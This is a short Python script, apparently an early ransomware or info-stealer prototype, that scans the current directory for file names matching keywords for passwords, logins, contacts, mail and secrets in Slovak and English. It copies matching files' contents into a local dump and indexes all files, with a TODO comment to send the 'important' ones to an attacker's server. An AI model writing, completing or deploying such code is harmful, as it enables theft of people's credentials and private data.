from itertools import count
import os 

# * Get the relative path in a string fromat
cwd = os.getcwd()
Files = []
ImpFiles = []

Keywords = ["heslo", "hesla", "hs", "password", "passwords", "heslá", "login", "ucty", "ucet", "pas", "user", "kontakty", "contacts", "konta", "kontakt", "tel", "Tel", "TEL", "mail", "spravy", "tajnosti"]
print("Current working directory: {0}".format(cwd))

def WriteToText():
    # Open or create the text file
    count = 0
    f= open("FileNames.txt","w+")
    f.write(f"Current working directory: {cwd}\n")
    
    # Write the most important data first
    if ImpFiles:
        for file in ImpFiles:
            count +=1
            f.write(f"IMP File number{count}:  {file}\n")
    print()

    # Then write the rest of the file names
    for file in Files:
        count +=1
        f.write(f"File number{count}:  {file}\n")
    print()
    f.close()

# Writes down the contents of a important file
def ReadText(file):
    # ! The try catch is here only beacuze some files require permission/cannot be read  
    try:
        fw = open("FileContent", "a+")
        fr = open(f"{file}", "r")
    
        text = fr.read()
        fw.write(f"Directory: {cwd}\n")
        fw.write(f"{file}: " + text)
        fw.write("\n")

        fr.close()
        fw.close()
    except:
        pass

# Main loop
for file in os.listdir(cwd):
    if file == "ransomware.py":
        continue

    # Add to the important list interesting file names
    for word in Keywords:
        if word in file:
            ReadText(file)
            ImpFiles.append(file)

    # Send to server the important shit 
    if file.endswith(".txt"):
        # TODO: copy the contents and send them to our server
        pass

    # Add the other files        
    if os.path.isfile(file):
        Files.append(file)

print(Files)
WriteToText()



